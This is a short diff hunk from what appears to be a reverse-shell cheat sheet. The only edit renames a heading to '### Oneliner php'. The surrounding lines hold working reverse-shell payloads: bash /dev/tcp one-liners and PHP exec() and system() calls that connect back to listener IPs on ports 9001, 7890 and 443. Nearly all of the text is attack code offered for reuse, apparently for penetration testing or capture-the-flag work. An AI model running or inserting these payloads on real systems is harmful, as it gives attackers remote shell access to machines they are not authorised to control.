@@ -17,7 +17,7 @@ bash -c "bash -i >& /dev/tcp/10.8.203.6/9001 0>&1"
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.203.6/7890 0>&1'"):
 ```
 
-php.revershell
+### Oneliner php
 ```python
 <?php
     system("bash -c 'bash -i >& /dev/tcp/10.10.14.85/443 0>&1'")
